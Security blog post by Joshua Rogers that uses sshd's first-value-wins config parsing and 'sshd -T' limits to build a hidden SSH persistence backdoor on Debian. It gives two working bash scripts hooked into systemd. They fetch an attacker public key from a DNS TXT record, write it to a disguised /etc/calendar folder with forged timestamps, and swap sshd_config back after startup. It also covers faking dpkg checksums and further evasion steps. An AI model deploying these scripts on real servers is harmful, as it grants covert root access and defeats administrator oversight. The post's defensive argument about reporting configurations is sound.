---
layout: post
title: "Everything that uses configurations should report the values they are using (or: achieving persistence with a hidden SSH backdoor)"
author: "Joshua Rogers"
categories: security
---

Configuration parsing is an interesting topic I have been working on in the context of my hacking and creating simple backdoors which are hidden from your average sysadmin.

A recent post titled [Everything that uses configuration files should report where they're located](https://utcc.utoronto.ca/~cks/space/blog/sysadmin/ReportConfigFileLocations) piqued my interest, as it related to the unique ways that configuration files are located, prioritized, and eventually parsed. The original post argued that programs should output the location that configuration files are parsed. I concur, and also believe that programs should report their _configurations_ as they are running. This post, among some information about `sshd`, outlines why.

As pointed out in the comments of [a HN post](https://news.ycombinator.com/item?id=36465886), parsing of configuration files generally take a "last occurrence wins" strategy -- if the same configuration option is specified multiple times, the final one takes preference (assuming the option cannot be specified multiple times). However, some programs, like `sshd` take the opposite approach: the _first_ occurrence wins. From `man sshd(8)`:
```
Unless noted otherwise, for each keyword, the first obtained value will be used.
```

_sshd_ also offers functionality to check the configuration _file_:

```
     -T      Extended test mode.  Check the validity of the configuration file, output the effective configuration to stdout and then exit.  Optionally, Match rules may be applied by specifying the connection parameters using one or more -C options.

     -t      Test mode.  Only check the validity of the configuration file and sanity of the keys.  This is useful for updating sshd reliably as configuration options may change.
```
One of the gotchas here is that this test (as it _is_ written) parses the configuration file as it exists; it does _not_ print the current configuration of a running _sshd_ daemon.

In the context of hacking, this is particularly useful, as it is possible to load a malicious `sshd_config` file, reload `sshd`, and then overwrite the malicious configuration file with an innocent-looking version. Your average sysadmin which may look at the `sshd_config` file or run `sshd -T` to check the configuration will be none-the-wiser to the actual configuration options used.

I recently made use of this functionality to create a minimalist ssh backdoor on Debian, achieving persistence quite easily. Using two scripts and updating systemd\'s `ssh.service` file to run the scripts before and after `sshd` starts, persistence using ssh is gained on the server. (Note: I also altered `/var/lib/dpkg/info/openssh-server.md5sums` to state the new ssh.service has the correct checksum.)

The first script has the following functionality:
1. Determine the proper `authorizedkeysfile` value.
2. Create the folder `/etc/calendar/` if it does not already exist, copying the access and modifications times of the `/etc/` folder.
3. Retrieve an SSH public key from the TXT record of `$(hostname).joshua.hu` and save it to `/etc/calendar/root`.
4. Copies the proper sshd configuration file to a temporary file.
5. Overwrites the original sshd configuration file with an `authorizedkeysfile`  option, which contains both the proper value as well as the `/etc/calendar/root` location (ensuring that this malicious `authorizedkeysfile` option is loaded first).
6. Appends the `loglevel` configuration to  the configuration file (ensuring it is loaded first).
7. Appends the original sshd configuration file from the temporary file, to the new sshd configuration file.

```bash
#!/bin/bash
keysfile=`/usr/sbin/sshd -T | awk -F authorizedkeysfile '/authorizedkeysfile/ {print $NF}'` || keysfile=".ssh/authorized_keys"

if [ ! -d "/etc/calendar/" ]; then
    mkdir /etc/calendar/
    touch -r /etc/ /etc/calendar/
fi

dig +short TXT $(hostname).joshua.hu | sed 's/\x22//g' > /etc/calendar/root

cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak

echo "AuthorizedKeysFile /etc/calendar/root ${keysfile}" > /etc/ssh/sshd_config
echo "LogLevel ERROR" >> /etc/ssh/sshd_config
cat /etc/ssh/sshd_config.bak >> /etc/ssh/sshd_config
exit 0
```

This script is run when sshd is (re)started, _before_ the sshd binary itself is executed, using the `ExecStartPre` systemd directive.

The second script, which is executed _after_ the sshd binary is running (using the `ExecStartPost` systemd directive) simply moves the original sshd configuration file back to its original location.

```bash
#!/bin/bash
mv /etc/ssh/sshd_config.bak /etc/ssh/sshd_config
touch -r /etc/ /etc/ssh/sshd_config
exit 0
```

The key which exists in `/etc/calendar/root` will now be accepted for all users on the server. A sysadmin looking at the `/etc/ssh/sshd_config` file will see nothing spectacular, and `sshd -T` will not report the in-memory configuration. Of course, if the sysadmin looks at the ssh.service file, they will see it has been altered (and which will be overwritten when `openssh-server` updates).

Things get a bit more interesting when it comes to to `sshd`. `sshd_config` in Debian 11+ and Ubuntu 20.04+ "[sets several options as standard in /etc/ssh/sshd_config which are not the default](https://manpages.debian.org/bullseye/openssh-server/sshd_config.5.en.html)". Namely, `Include /etc/ssh/sshd_config.d/*.conf`. This is the first actionable configuration in `/etc/ssh/sshd_config` on Debian 11 and Ubuntu 20.04.

Therefore, instead of editing `/etc/ssh/sshd_config`, it is possible to simply create a file ending in `.conf` in `/etc/ssh/sshd_config.d/` and restart `sshd`, and then delete the file.

What's even more fun is that when `sshd` is reloaded, current connections do not acquire the new configuration. For multiplexed SSH connections, this means you may even hide your connection using an old configuration.

Is this what the DoD meant by [living off the land](https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF)? By knowing how programs use configuration files and abusing their functionality for exploitation?

A more persistent threat would:
1. Use something like [shc](https://github.com/neurobin/shc) to convert these scripts into binaries,
2. Use some type of encryption/encoding for the retrieval of the public key (versus plaintext over DNS),
3. Set the `ctime` of the files using a [basic trick](https://unix.stackexchange.com/a/557160),
4. Use an alternative to altering the `ssh.service` systemd file (for example some type of service that monitors for when `sshd` starts/reloads and performs the necessary changes at the appropriate times, independent of systemd.) 
